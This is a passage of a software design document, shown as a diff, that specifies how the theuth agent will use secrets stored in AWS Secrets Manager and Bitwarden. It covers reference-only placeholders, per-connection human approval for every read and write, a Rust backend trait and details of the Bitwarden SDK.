@@ -1,0 +1,1237 @@
+# 221 — External secret backends: AWS Secrets Manager and Bitwarden
+
+Status: design · 2026-11-25 · not built. Extends `37-secrets.md` (the vault, placeholders, scrub,
+`secret_*` tools; its §11 "Extension: backends" is the seam this doc fills and, where the two
+disagree, this doc wins for external backends) and `219-always-ask.md` (the override every external
+read and write goes through). Reads `216-external-plugins.md` only to reject it as the vehicle (D4).
+Every claim about theuth cites `path#Lx-Ly` as of the `design/221-external-secrets` branch point
+(`2a60c9af6`); every Bitwarden SDK claim cites `bitwarden/sdk-internal` at the pinned commit
+**`2b06afa3b3579af116cd60f83d65b9e411fd2a56`** (2026-11-24, "PAM: Live-server end-to-end suite for
+the access connector (#1752)"), written `sdk@2b06afa:path#Lx-Ly`.
+
+theuth's vault (37) holds secrets the agent can *use* through a `{{secret:NAME}}` placeholder but
+never *read*. Many users already keep those secrets somewhere else: a company's AWS Secrets Manager,
+a personal or family Bitwarden vault. Today the only way to use one is to copy it into theuth by
+hand. This doc adds two **external backends**. Through them the agent can:
+- use an external secret by reference, with the same "use, never read" guarantee;
+- browse external secrets' metadata;
+- store a value the user typed into theuth's masked card *into* the external manager.
+
+Every external read and every external write raises an approval card a human must answer, unless the
+user turns that off for one connection in Settings.
+
+```mermaid
+flowchart LR
+  subgraph engine["t (one engine)"]
+    model["model<br/>writes {{secret:bw/personal/…#password}}"] --> reg["tools registry<br/>gate → always-ask card (219)"]
+    reg -->|"after Allow"| hook["tools::secrets hook<br/>resolve_external → expand"]
+    hook --> sa["secrets actor<br/>(37)"]
+    sa --> vault["local vault rows<br/>(replicated, 37/67)"]
+    sa --> ext["ext registry<br/>dyn ExternalBackend"]
+    ext --> aws["secrets-aws<br/>aws-sdk-secretsmanager"]
+    ext --> bw["secrets-bitwarden (feature)<br/>sdk-internal @2b06afa, in-process"]
+    meta["meta table (engine-local)<br/>sealed connection credentials"] -.-> ext
+  end
+  aws --> AWS[("AWS Secrets Manager")]
+  bw --> BW[("Bitwarden cloud US/EU<br/>self-hosted · Vaultwarden")]
+```
+
+## 0. What exists today, what does not
+
+| Piece | Today | Cite |
+|---|---|---|
+| Backend seam | Designed only: a `Backend` trait with `id/list/get/set/delete` and `RegisterBackend`, "v1 contract, not v0 code". v0 ships the name reservation, `back` in the API and `SecretInfo.source` | `docs/design/37-secrets.md#L743-L782` |
+| Name reservation | A local name is `[A-Za-z0-9_.-]{1,64}`; `/` "is reserved for backends (37 §11)" | `crates/secrets/src/vault.rs#L237-L244`, `docs/design/37-secrets.md#L116-L123` |
+| `SecretInfo.source` | "Backend; always `local` in v0"; `secret_list` fills `"local"` | `crates/secrets/src/vault.rs#L87-L106`, `crates/secrets/src/tools.rs#L883` |
+| Reserved `/` families | `oauth/`, `mesh/`, `sandbox/`, `share/`, `plugins/`: written only through `Vault::set_if_version`, never listed, never expandable | `crates/secrets/src/vault.rs#L246-L266`, `#L276-L290` |
+| Listing hides `/` rows | `list()` filters every name containing `/` | `crates/secrets/src/vault.rs#L721-L731` |
+| Placeholder grammar | `\{\{secret:([A-Za-z0-9_.\-]+)(?::-([1-4]))?\}\}`. A `/` does not match, so `{{secret:bw/x}}` stays literal text today. 37 §3.1 promised "unknown secret" | `crates/secrets/src/vault.rs#L47-L48`, `docs/design/37-secrets.md#L196-L212` |
+| Expansion | `Vault::expand` is **synchronous**, over the in-memory copy; `lookup` fails on an unknown name, an expired value or a missing version | `crates/secrets/src/vault.rs#L902-L938`, `#L1242-L1266` |
+| Hook in `tools` | `trait Secrets { expand, redact, redact_value, redact_spans, max_literal_len }`, all sync; a process global `install` | `crates/tools/src/secrets.rs#L20-L104` |
+| Where expansion runs | In the async `invoke`, after the approval and before `tool.call`, only when `tool.consumes_secrets()`; `redact_output` on every arm | `crates/tools/src/registry.rs#L3515-L3523`, `#L3599-L3600` |
+| Gate | `mentions` (placeholder in args, consuming tool) → at least `Ask`; `always(…, protected)` → `Ask` that no switch rewrites; owner absent → `Deny` | `crates/tools/src/registry.rs#L1849-L1883`, `#L1890-L1894`, `#L3363-L3368` |
+| Always-ask matching | Tool name or `mcp:<server>` key in the global, session or ancestor sets | `crates/tools/src/registry.rs#L1552-L1576` |
+| Always-ask RPC | `get_always_ask` / `set_always_ask(session, tool, on)`. Removal needs the owner's press, else a human-only card | `crates/agent/src/rpc_tooling.rs#L118-L136`, `docs/design/219-always-ask.md#L58-L64` |
+| Per-call risk raise | `Tool::CREDENTIALED` / `credentialed(session, args)`: the call is gated as at least `Mutating` | `crates/tools/src/lib.rs#L415-L433` |
+| Masked collection | `secret_request` (one value or a form of ≤ 16 fields, optional `expires`), `SecretsEvent::Requested`, `answer_secret` from any engine | `crates/secrets/src/tools.rs#L153-L174`, `crates/secrets/src/lib.rs#L270-L310`, `crates/secrets/src/rpc.rs#L29-L40` |
+| Replication | `vault`, `vault_current`, `secret_requests` replicate; `meta` is local only; values are sealed under the shared mesh key | `crates/secrets/src/store.rs#L17`, `crates/secrets/migrations/0001_secrets.sql#L1-L25`, `crates/secrets/src/vault.rs#L1-L11` |
+| Engine-local secret precedent | `plugins/grants-key` lives in `meta`, sealed with this engine's key, "because vault rows replicate across the mesh" | `crates/secrets/src/vault.rs#L268-L271`, `#L567-L583` |
+| AWS profiles | `AwsProfiles { profiles, selected, default_profile }` from `aws_config::profile::load`; `ListAwsProfiles` / `SetAwsProfile` persist `agent.aws_profile` for Bedrock | `crates/agent/src/aws.rs#L1-L64`, `crates/agent/src/supervisor.rs#L10588-L10622`, `#L12327-L12348` |
+| AWS crates | `aws-config = "1"` (lock: 1.13.0, which pulls `aws-sdk-sso` 1.119 and `aws-sdk-ssooidc` 1.121). **No `aws-sdk-secretsmanager`** | `Cargo.toml#L243`, `Cargo.lock#L1698-L1699`, `#L1790-L1791`, `#L1815-L1816` |
+| HTTP/TLS | `reqwest 0.13`, rustls, no native-tls | `Cargo.toml#L213` |
+| Secrets UIs | Desktop page `/secrets` (`library/Secrets.tsx`), `SecretRequestCard`, Settings › Approvals' always-ask section; TUI `/secrets` | `crates/desktop/ui/src/components/library/Secrets.tsx#L27`, `crates/desktop/ui/src/components/chat/SecretRequestCard.tsx#L101-L142`, `crates/desktop/ui/src/components/settings/Approvals.tsx#L32-L87`, `crates/tui/src/components/secrets.rs#L12`, `crates/tui/src/model/slash.rs#L225` |
+
+What does not exist: any backend trait in code, any network-backed secret, an async step before
+expansion, a way to gate by *what* a placeholder points at (rather than by tool), and a masked card
+whose answer goes anywhere but the local vault.
+
+## 1. Decisions
+
+Each says what it beat. D1–D7 are the owner's and are fixed. D8 onward are this doc's.
+
+**D1 — Two backends now: AWS Secrets Manager and Bitwarden Password Manager (owner).** Bitwarden
+here means the personal/organisation vault (logins, secure notes, custom fields). It is **not**
+Bitwarden Secrets Manager (machine accounts, projects). The trait (§4) is written for both and should
+fit a third backend. Nothing else is in scope.
+
+**D2 — Bitwarden works against the official cloud (US and EU) and self-hosted servers (official
+self-host and Vaultwarden) (owner).** The server URLs (base, api, identity) are config on each
+connection, with presets `us` (`vault.bitwarden.com`), `eu` (`vault.bitwarden.eu`) and `self_hosted`
+(one base URL, from which `/api` and `/identity` are derived, each overridable). §6.2.
+
+**D3 — Bitwarden runs in process, in Rust, on the official `bitwarden/sdk-internal` crates, under the
+GPL-3.0 option of their dual licence (owner).** It is a git dependency pinned to one commit
+(`2b06afa`), because `bitwarden-pm` / `bitwarden-vault` at current versions are not on crates.io and
+the README says the Password Manager interface is unstable and changes without warning (§5.9). The
+SDK sits behind theuth's own `ExternalBackend` trait (§4), so an SDK bump touches one module. It lives
+in its own crate, `crates/secrets-bitwarden`, behind a cargo feature `bitwarden` on the binary,
+because the SDK workspace is large (§5.10). theuth is open source, and linking GPL-3.0 code is
+accepted. The licence consequence for the distributed binary is recorded in §11.
+
+**D4 — Rejected (owner), with reasons:**
+- *Shelling out to the `bw` CLI or `bw serve`.* An external CLI is out of the question: a Node
+  runtime to install and keep current, a session key passed through env or argv, and a local HTTP
+  server (`bw serve`) that anything on the box can call.
+- *An external plugin (216) in JS or Python.* Every JS or Python Password Manager library is one of
+  three things: the same Rust core compiled to wasm, a wrapper around `bw`, or Secrets-Manager-only.
+  So a plugin adds a process and a language and gains nothing. Worse, the plugin process would hold
+  the decrypted vault key, and secret values would cross the plugin boundary. 216 deliberately makes
+  `plugins/` vault rows non-expandable (`crates/secrets/src/vault.rs#L263-L266`), so a plugin-backed
+  placeholder would have to break that rule.
+- *`rbw`.* Unofficial, MIT, its library API is unstable, and its last release was 2025-12-31. It is
+  recorded as the fallback if the SDK pin becomes unworkable (§11 says
+  when we would reach for it).
+- *The `bitwarden` crate 2.1.0 on crates.io.* It covers the Secrets Manager product only.
+
+**D5 — AWS reuses the existing profile selection; `aws-sdk-secretsmanager` is added (owner).** A
+connection names a profile from the same `aws_config::profile::load` list the Bedrock picker shows
+(`crates/agent/src/aws.rs#L31-L51`), plus a region. Today only `aws-config` is a dependency
+(`Cargo.toml#L243`). This doc adds `aws-sdk-secretsmanager = "1"` to `[workspace.dependencies]`,
+with the default features off except `rustls` and `rt-tokio`, matching how `aws-config` is used. The
+profile list moves out of `agent` so the backend crate can share it without depending on `agent`
+(§6.1, B1).
+
+**D6 — Every external read and every external write is always ask (219) by default (owner).** The
+user can turn this off in Settings. The mechanism is 219's own, with no second gate (D10). The knob
+is **per connection and per direction**: two always-ask entries per connection,
+`secret:<backend>/<conn>:read` and `secret:<backend>/<conn>:write`, seeded harness-wide when the
+connection is created (D10, §8). Why this granularity:
+- *Per connection, not per backend.* A scratch AWS account and the user's personal Bitwarden carry
+  different risk, and the user can tell them apart.
+- *Per direction.* Reads (placeholder expansion) are the frequent, exfiltration-shaped operation.
+  Writes are rare and visible.
+- *Not per secret.* That would be a policy language (37 D4 rejected a second policy). A user who wants
+  one secret un-asked imports it into the local vault (`secret_external_import`, §7) and gets 37's
+  rules for it.
+
+**D7 — Secrets can be collected through the UI and stored into the external manager (owner).** The
+`secret_request` card (masked fields) gains a destination: AWS name/path, region (from the
+connection), profile (from the connection), optional KMS key, and JSON key/value vs plain string;
+Bitwarden organisation / collection / folder, item type (login, secure note, custom fields) and which
+field. The agent never sees values, exactly as with the local vault. §7.3, §9.3.
+
+**D8 — Addressing: `{{secret:<backend>/<conn>/<ref>[#<key>]}}`, resolved on the engine that runs the
+tool.** §3. `aws/<conn>/<secret-name>[#json-key]` and `bw/<conn>/<item-uuid>[#field]`. The backend id
+and the connection name come first, so a reader of the approval card knows which manager and which
+account before anything else. The local namespace is unchanged: an unprefixed name is still
+`local`. Rejected:
+- *Bitwarden by item name.* Names are not unique, and they change.
+- *AWS by ARN.* An ARN repeats the region and account that the connection already fixes, and it is
+  60+ characters on every card.
+- *A backend-less `conn/ref`.* It saves three characters and makes `aws/…` vs `bw/…` ambiguous the
+  day a connection is named `aws`.
+
+**D9 — Placeholders may expand external references, through a new async resolve step, and no
+external value is cached across calls.** §3.3. Each use fetches (AWS) or decrypts from the last sync
+(Bitwarden, §5.4) once per call, after the approval. The value joins the scrub set for the life of
+the process (37 §11 already said so). Rejected:
+- *Import-only (the agent must copy a value into the local vault before using it).* It doubles every
+  value, so the external manager stops being the truth on the first rotation.
+- *A value cache with a TTL.* It would hold plaintext between uses, and the approval card would then
+  approve a stale value without saying so.
+
+**D10 — The always-ask entries are ordinary 219 entries in `tools.always_ask`, matched against the
+external references a call touches, not against tool names.** 219 already has keys that are not tool
+names (`mcp:<server>`, `docs/design/219-always-ask.md#L22-L30`); `secret:…` is a third family. This
+choice gives, for free:
+- one list in Settings › Approvals;
+- the per-chat scope;
+- removal guarded by the human press (219 §2.4);
+- `owner_absent` → Deny;
+- a human-answered card, which the double never answers.
+
+The registry computes a call's `external: Vec<ExternalAccess>` from its args through the
+`tools::secrets` hook and ORs `external_always` into `always()` next to `protected`
+(`crates/tools/src/registry.rs#L1890-L1894`). Rejected:
+- *A `secrets.external.<conn>.ask: always|policy` config key with its own check.* That is a second
+  gate, and it fails 219's "single choke point" (219 §2.2).
+- *Marking the `secret_external_*` tool names always-ask.* A placeholder in `shell` is an external
+  read whose tool is `shell`, and tool names cannot tell one connection from another.
+
+**D11 — Connection config lives in `config.yaml`; connection credentials and the unlocked state never
+replicate.** §6, §10.
+- *Config.* `secrets.connections` holds non-secret settings: profile, region, server URLs, email,
+  default destination. It is engine-local and human-editable.
+- *Credentials.* Bitwarden's `client_secret`, and an optional remembered master password if Q1
+  allows one, sit in the engine-local `meta` table, sealed with this engine's key (the
+  `plugins/grants-key` precedent, `crates/secrets/src/vault.rs#L567-L583`), under names
+  `ext/<backend>/<conn>/<key>`.
+- *Unlocked state.* The Bitwarden user key is memory only (D12).
+
+Rejected:
+- *Vault rows.* Those replicate to every paired engine (`crates/secrets/src/store.rs#L17`). That
+  would make every engine a Bitwarden "device" holding the user's API key, and widen a single
+  stolen-laptop compromise to the whole vault for no benefit, since each engine needs its own
+  login anyway.
+- *Keychain items per connection.* A second root of trust beside the vault key.
+
+**D12 — Bitwarden: personal API key for login, master password for unlock, user key in memory only,
+auto-lock on idle.** §6.2. API-key login skips 2FA and new-device verification
+(§5.2), which a headless daemon cannot answer gracefully. Password login with 2FA is offered for users
+who cannot create an API key (some org policies), via a masked card that also carries the 2FA code.
+The master password is typed into a masked **unlock card** each time (never stored in v1, Q1). The
+derived user key lives only in the SDK client's key store and is dropped on lock. Rejected:
+- *Storing the master password.* Then the vault-at-rest is as strong as the engine key, not as strong
+  as the master password plus KDF.
+- *Sealing the user key in `meta` to survive restarts.* Same objection; offered as Q1.
+
+**D13 — No delete, anywhere, in v1.** Not a tool, not an RPC method, not a UI button. 37 D5 already
+keeps deletion away from the agent. For the user, the vendor's own UI deletes better than we would:
+Bitwarden's trash and restore, and AWS's recovery window. The trait has no `delete` (§4).
+
+**D14 — Values never reach the model, and `secret_request` with a destination is at least
+`Mutating`.** The `secret_external_*` tools return metadata, receipts and references (§7). A
+`secret_request` that names a destination uses the existing per-call raise (`CREDENTIALED`,
+`crates/tools/src/lib.rs#L415-L433`). It does act with the user's credentials, so a subagent capped
+at `read_only` cannot write to Bitwarden through it.
+
+**D15 — Connection operations run on the engine that owns the connection; answers are forwarded,
+never replicated.** A `secret_request` answered on another engine's app reaches the asking engine
+over the existing forward path (`crates/agent/src/rpc_forward.rs#L369`). The answer is not written
+as a replicated staging row (§10).
+
+## 2. Facts relied on
+
+- **AWS Secrets Manager** (`aws-sdk-secretsmanager` 1.x; API names from the service model):
+  - `ListSecrets` (filters `name`, `description`, `tag-key`; paginated) and `DescribeSecret`
+    (`VersionIdsToStages`, `LastChangedDate`, `KmsKeyId`, tags) return metadata without values.
+  - `GetSecretValue(SecretId, VersionId | VersionStage)` returns `SecretString` or `SecretBinary`,
+    plus `VersionId` and `VersionStages`.
+  - `CreateSecret(Name, SecretString, KmsKeyId?, Description?, Tags?, ClientRequestToken)` creates
+    a secret. `PutSecretValue(SecretId, SecretString, ClientRequestToken)` adds a version that
+    becomes `AWSCURRENT`; the old one becomes `AWSPREVIOUS`.
+  - A secret name allows `[A-Za-z0-9/_+=.@-]{1,512}`.
+  - `ClientRequestToken` makes create and put idempotent, so a retried call does not add a second
+    version.
+- **`aws-config` 1.13** resolves a named profile, including `sso_session` profiles. It refreshes an
+  SSO access token through `aws-sdk-ssooidc` (already in the lock) while the refresh token is valid.
+  It does **not** perform the first device-authorisation login. An expired SSO session surfaces as a
+  credentials-provider error, so the user runs their usual `aws sso login` outside theuth (§6.1).
+- **Bitwarden Password Manager**: see §5. Every SDK fact there cites `sdk@2b06afa`.
+- **theuth**: `invoke` is async and expansion already sits in it
+  (`crates/tools/src/registry.rs#L3515-L3523`), so an awaited resolve step before the sync `expand`
+  needs no actor redesign. The registry's `gate` runs in the actor's `Message<Invoke>` handler
+  (`#L3252-L3264`) and must stay synchronous and cheap. The external-access computation is a parse of
+  the args, not I/O.
+
+## 3. Addressing and placeholders
+
+### 3.1 Grammar
+
+```
+{{secret:NAME}}                       local, current        NAME = [A-Za-z0-9_.-]{1,64}         (37, unchanged)
+{{secret:NAME:-N}}                    local, N back         N ∈ 1..=4                            (37, unchanged)
+{{secret:aws/CONN/SECRET}}            AWS, AWSCURRENT, whole SecretString
+{{secret:aws/CONN/SECRET#KEY}}        AWS, AWSCURRENT, top-level JSON key KEY (string, number or bool → text)
+{{secret:aws/CONN/SECRET:-1}}         AWS, AWSPREVIOUS (only :-1; the stage, not a count)
+{{secret:bw/CONN/ITEM}}               Bitwarden, login password (login items) or notes (secure notes)
+{{secret:bw/CONN/ITEM#FIELD}}         Bitwarden, FIELD ∈ password | username | totp | notes | uri | field:<custom name>
+```
+
+- `CONN` = `[a-z0-9-]{1,32}`, unique per engine across both backends.
+- `SECRET` = AWS's name alphabet minus `#`, `:` and `}` (`[A-Za-z0-9/_+=.@-]{1,512}`, which has
+  none of them). Slashes in AWS names (`prod/db/password`) are allowed: everything after `aws/CONN/`
+  up to `#`, `:-1` or `}}` is the name.
+- `ITEM` = a canonical lowercase UUID (`CipherId`, §5.5).
+- `#totp` expands to the **current TOTP code**, which the SDK generates from the stored seed (§5.5),
+  never the seed itself. `#field:<name>` takes the first custom field with that exact name. A
+  `boolean` field expands to `true`/`false`; a `linked` field is followed to its target.
+- `:-N` on Bitwarden is an error (`bw references have no versions; use the item's password history in
+  the Bitwarden app`). The SDK keeps only a login password's `passwordHistory`, and exposing it would
+  be a read path the user never opted into.
+
+The new placeholder regex (one, `crates/secrets/src/vault.rs` `PLACEHOLDER`) is
+
+```
+\{\{secret:(?:(aws|bw)/([a-z0-9-]{1,32})/([A-Za-z0-9/_+=.@\-]{1,512}?)(?:#([^:}]{1,128}))?|([A-Za-z0-9_.\-]+))(?::-([1-4]))?\}\}
+```
+
+`mentions` (`crates/tools/src/secrets.rs#L52-L61`) stays the cheap `contains("{{secret:")` scan: it
+already matches external references.
+
+### 3.2 Reserved names
+
+| Prefix | Rule | Why |
+|---|---|---|
+| `aws/`, `bw/` | **Placeholder namespaces, never vault rows.** `writable_name` already refuses them (no `/` family lists them, `crates/secrets/src/vault.rs#L276-L290`); add a unit test that pins it | A vault row named `bw/x/y` would shadow an external reference |
+| `ext/` | `meta` keys only (`ext/<backend>/<conn>/<key>`), sealed with the engine key, never a vault row, never listed, never expandable | D11 |
+| any future backend id | Added to the table and to the regex's alternation in the same change | One list, one place |
+
+The 37 §3.1 promise ("v0 returns unknown secret" for `BACKEND/NAME`) becomes: an `aws/` or `bw/`
+reference to a connection this engine does not have fails the call with `unknown connection
+bw/personal on this engine; secret_external_list shows the connections`. Any other `x/…` form fails
+with `unknown secret backend x`. Today such text passes through literally (§0), which is a silent
+footgun; the new regex closes it.
+
+### 3.3 Resolution: where the network call happens
+
+`Secrets` (`crates/tools/src/secrets.rs#L20-L41`) gains two methods, both with no-op defaults so the
+trait stays implementable without backends:
+
+```rust
+/// Which external references `args` names, and in which direction this call uses them. Sync, no I/O:
+/// a parse. The registry ORs `external_always` of these into `always()` (D10). `tool` lets the
+/// `secret_external_*` tools declare a write (their args name a destination, not a placeholder).
+fn external_access(&self, tool: &str, args: &serde_json::Value) -> Vec<ExternalAccess> { Vec::new() }
+
+/// Fetch every external reference in `args` (after the approval, before `expand`). The values go
+/// into `fetched`, which `expand_with` reads; each joins the scrub set before this returns.
+/// Err = unknown connection, locked and not unlocked in time, not found, denied by the provider,
+/// timeout. Then the call fails whole, as 37 §3.1 says for a local miss.
+fn resolve_external<'a>(&'a self, args: &'a serde_json::Value, cx: ResolveCx)
+    -> BoxFuture<'a, Result<Fetched, String>> { Box::pin(async { Ok(Fetched::default()) }) }
+```
+
+```rust
+#[derive(Clone, Debug, PartialEq, Eq, Hash)]
+pub struct ExternalAccess { pub backend: &'static str, pub conn: String, pub dir: Direction }
+#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)] pub enum Direction { Read, Write }
+impl ExternalAccess { pub fn always_ask_key(&self) -> String { format!("secret:{}/{}:{}", self.backend, self.conn, self.dir) } }
+pub struct ResolveCx { pub session: SessionId, pub call_id: String }
+/// `(placeholder text) → value`; zeroized on drop; never Debug-printed.
+#[derive(Default)] pub struct Fetched(HashMap<String, Zeroizing<String>>);
+```
+
+The `invoke` site (`crates/tools/src/registry.rs#L3515-L3523`) becomes:
+
+```rust
+if tool.consumes_secrets() {
+    let fetched = match crate::secrets::resolve_external(&call.args, ResolveCx { … }).await {
+        Ok(f) => f, Err(e) => return ToolOutput::err(e),
+    };
+    if let Err(e) = crate::secrets::expand_with(&mut call.args, &fetched) { return ToolOutput::err(e) }
+}   // `fetched` dropped (zeroized) here, before `tool.call`'s output is built
+```
+
+`Vault::expand` gains a `&Fetched` argument. It replaces an external placeholder from the map and
+fails on one missing from it, which is a bug guard: `resolve_external` fills every reference first.
+Callers without external support (`mcp::expand` at connect time, 37 §3.4) pass `&Fetched::default()`.
+**External references in `mcp/*.json` are not supported in v1.** An MCP server connects unattended,
+and nobody is there to answer an always-ask card. The error names the local-vault import as the
+workaround.
+
+### 3.4 Interaction with always-ask and caching, stated once
+
+1. The gate (sync, actor) asks `external_access(tool, args)` and computes `external = any access
+   whose always_ask_key is in the global / session / ancestor sets`. `always()` becomes
+   `protected || external || always_ask_applies(…) || …`. The card carries `always_ask: true`.
+   `owner_absent` → Deny with 219's text (`crates/tools/src/registry.rs#L1932-L1946`).
+2. A read the user has set to policy (entry removed) still gets 37 §0.4's `mentions` → `Ask`, which
+   `/approvals off` silences. External placeholders then behave exactly like local ones.
+3. After Allow, `resolve_external` fetches. A locked Bitwarden connection raises the **unlock card**
+   (§9.4) and waits up to `secrets.request_timeout_secs`. There are two cards because they ask two
+   different things: "may this call use it" and "type your master password".
+4. Values: fetched per call, never cached as values. They join the scrub set for the life of the
+   process, `Zeroizing` (§11). Bitwarden *metadata* (the synced cipher list, encrypted at rest in
+   memory as the SDK holds it) is cached between syncs (§5.4). AWS metadata (`ListSecrets` pages) is
+   cached for `list_ttl_secs` (60) for the UI and the `list` tool only, never for `get`.
+5. Approval replay on resume (`HonourAnswer`, 219 §9) is unchanged. A replayed Allow for a call that
+   references an external secret still runs `resolve_external` fresh.
+
+## 4. The backend trait
+
+`crates/secrets/src/external.rs` (new module, in `secrets`; no SDK types cross it):
+
+```rust
+#[async_trait::async_trait]
+pub trait ExternalBackend: Send + Sync + 'static {
+    /// `aws` | `bw`; the placeholder namespace and the always-ask key's backend.
+    fn backend(&self) -> &'static str;
+    /// The connection name (`[a-z0-9-]{1,32}`).
+    fn conn(&self) -> &str;
+    /// Cheap, no I/O: what the UIs show and what `resolve` checks first.
+    fn status(&self) -> ConnStatus;
+    /// Network check (AWS: `ListSecrets` max 1; Bitwarden: sync when unlocked, prelogin when not).
+    async fn probe(&self) -> Result<ConnStatus, ExtError>;
+
+    /// Metadata only. `query` = substring on name/folder/collection; `cursor` pages.
+    async fn list(&self, q: ListQuery) -> Result<ListPage, ExtError>;
+    /// One entry's metadata: versions, stages, fields (names and kinds, never values).
+    async fn describe(&self, r: &ExtRef) -> Result<ExtEntry, ExtError>;
+    /// The value at `r` (+ key/field), with the version it came from. Only `resolve_external`
+    /// and `secret_external_import` call this.
+    async fn get(&self, r: &ExtRef) -> Result<(Zeroizing<String>, ExtVersion), ExtError>;
+    /// A new entry at `loc`; Err(Exists) if it exists. Returns the reference to use.
+    async fn create(&self, loc: &Location, value: Value<'_>) -> Result<(ExtRef, ExtVersion), ExtError>;
+    /// Replace the value at `r` (AWS: a new version; Bitwarden: edit the field in place).
+    /// `expected` = the version the caller saw (AWS VersionId / Bitwarden revision date).
+    /// A mismatch is `Conflict`, never a blind overwrite.
+    async fn update(&self, r: &ExtRef, value: Value<'_>, expected: Option<&ExtVersion>) -> Result<ExtVersion, ExtError>;
+    /// Lock (Bitwarden: drop keys; AWS: drop the cached SdkConfig credentials). Idempotent.
+    async fn lock(&self);
+    // no delete (D13)
+}
+
+pub struct ExtRef { pub conn: String, pub id: String, pub key: Option<String>, pub back: u8 }
+pub enum Value<'a> { Plain(&'a str), Json(Vec<(&'a str, &'a str)>) }  // AWS JSON k/v; Bitwarden: Plain only
+pub enum Location {
+    Aws { name: String, kms_key_id: Option<String>, description: Option<String>, json_key: Option<String> },
+    Bw  { org: Option<OrgId>, collections: Vec<CollectionId>, folder: Option<FolderId>,
+          kind: BwKind /* Login | SecureNote */, item_name: String, field: BwField,
+          username: Option<String> /* login, from a non-masked card field */, uri: Option<String> },
+}
+pub enum BwField { Password, Notes, Totp, Custom { name: String, hidden: bool } }
+
+pub struct ExtVersion {
+    /// AWS: VersionId (UUID). Bitwarden: the cipher's revision_date (RFC 3339).
+    pub id: String,
+    /// AWS: VersionStages (AWSCURRENT, AWSPREVIOUS, custom). Bitwarden: empty.
+    pub stages: Vec<String>,
+    pub changed: Option<String>,  // RFC 3339
+}
+pub struct ExtEntry {
+    pub r#ref: String,            // the placeholder body, `bw/personal/2f1c…` / `aws/prod/db/main`
+    pub name: String,             // AWS name / Bitwarden item name
+    pub kind: String,             // `string` | `json` | `binary` | `login` | `secure_note` | `card` | `identity` | `ssh_key`
+    pub keys: Vec<String>,        // AWS JSON keys (names only, from a value fetch the user approved, else empty) / Bitwarden: `password`, `username`, `totp`, `notes`, `field:<name>`
+    pub location: String,         // AWS: region + KMS alias; Bitwarden: `org / collection / folder`
+    pub versions: Vec<ExtVersion>,// AWS: up to 5 by VersionIdsToStages; Bitwarden: one
+}
+
+pub enum ConnStatus { Ready, Locked, LoggedOut, Expired { hint: String }, Error(String), Unsupported(String) }
+
+#[derive(Debug)]
+pub enum ExtError {
+    UnknownConn, Locked, LoggedOut, Expired(String) /* AWS SSO; Bitwarden refresh token */,
+    NotFound, Exists, Conflict { current: ExtVersion }, Denied(String) /* IAM / org permission */,
+    Unsupported(String) /* binary secret; card item; Vaultwarden endpoint */, Timeout, Network(String), Sdk(String),
+}
+```
+
+- **Errors as text.** `Display` strings are model-facing and must never contain a value. `Sdk(_)`
+  strings from the SDK are scrubbed with `redact` before display, defence in depth.
+- **Timeouts.** Every method runs under `tokio::time::timeout(secrets.external.timeout_secs = 20)`.
+  The AWS client also sets `TimeoutConfig` (connect 5 s, operation 15 s); the Bitwarden HTTP client
+  is the SDK's `reqwest` (§5.1). `Timeout` maps to `ToolOutput::err("<ref>: <backend> did not answer
+  in 20 s")`.
+- **Versions.**
+  - AWS: `ExtVersion.id` = `VersionId`. `update(expected)` passes the expected `AWSCURRENT` id by
+    calling `DescribeSecret` first. AWS has no conditional put, so a race between that describe and
+    the `PutSecretValue` is possible; it is documented, and the old version survives as
+    `AWSPREVIOUS` anyway.
+  - Bitwarden: `ExtVersion.id` = `revision_date`. The server rejects an edit whose `lastKnownRevisionDate`
+    is stale (§5.6), which is a real compare-and-swap.
+- **Registration.** `secrets::RegisterExternal(Arc<dyn ExternalBackend>)` and
+  `UnregisterExternal { backend, conn }` (37 §11's `RegisterBackend` shape, renamed because the
+  local vault does *not* become one of these). 37 §11 had the vault `impl Backend`; that is dropped.
+  The vault's API is sync and richer (`back` 1..=4, expiry, `set_if_version`), so forcing it behind
+  an async network trait would cost every local expansion an await for nothing.
+
+## 5. Bitwarden SDK surface at `sdk@2b06afa`
+
+Read from a shallow clone at the pin. Nothing was built. Paths are relative to the SDK repo root.
+**Bottom line:** the SDK does the crypto, token renewal, and the HTTP for cipher, folder and Send
+create/edit/delete and for `/sync`. It does **not** put ciphers, collections, organisations or org
+keys into its stores after a sync (theuth does, §5.4). Its password login cannot answer new-device
+verification and hard-codes a device id (theuth does its own token request, §5.2). The in-repo `bw`
+CLI does not create or edit items yet, so it is no reference for vault writes (§5.6). It is a
+reference for Sends (§12.2).
+
+### 5.1 Client construction, custom servers
+
+- `ClientSettings { identity_url, api_url, user_agent, device_type, device_identifier,
+  bitwarden_client_version, bitwarden_package_type, transport }`, `#[serde(default, deny_unknown_fields)]`.
+  The defaults are `https://identity.bitwarden.com` and `https://api.bitwarden.com`, user agent
+  `"Bitwarden Rust-SDK"` and `DeviceType::SDK` (`sdk@2b06afa:crates/bitwarden-core/src/client/client_settings.rs#L23-L66`).
+- URLs are used as given; no path is appended (`sdk@2b06afa:crates/bitwarden-core/src/client/builder.rs#L113`,
+  `#L155`). theuth derives `<base>/api` and `<base>/identity` for self-hosted, as `bw` does
+  (`sdk@2b06afa:crates/bw/src/auth/mod.rs#L36-L41`). EU cloud = `https://api.bitwarden.eu` /
+  `https://identity.bitwarden.eu` (`sdk@2b06afa:crates/bw/src/tools/receive.rs#L57-L62`).
+- `PasswordManagerClient(pub bitwarden_core::Client)`. `PasswordManagerClient::new(Option<ClientSettings>)`
+  installs `PasswordManagerTokenHandler`, which renews tokens on its own
+  (`sdk@2b06afa:crates/bitwarden-pm/src/lib.rs#L78-L88`).
+  - Its builder has no `with_state`. A custom `StateRegistry` means building with
+    `bitwarden_core::ClientBuilder::with_state(..)` and wrapping the result, as `bw` does
+    (`sdk@2b06afa:crates/bitwarden-core/src/client/builder.rs#L77-L105`,
+    `crates/bw/src/main.rs#L229-L236`).
+  - theuth does **not** need a custom registry. The default is `StateRegistry::new_with_memory_db`
+    (`builder.rs#L103-L105`), which is what D12 wants.
+- **Do not** use `bitwarden_core::Client::new`: its `NoopTokenHandler::set_tokens` panics on login
+  (`sdk@2b06afa:crates/bitwarden-core/src/auth/auth_tokens.rs#L126-L128`).
+- Sub-clients used: `auth()`, `crypto()`, `vault()` (→ `ciphers()`, `folders()`, `totp()`,
+  `collections()`), `collections()`, `sends()`, `sync()`, `is_unlocked()` and `unlock()`
+  (`sdk@2b06afa:crates/bitwarden-pm/src/lib.rs#L136-L286`,
+  `crates/bitwarden-vault/src/vault_client.rs#L22-L60`).
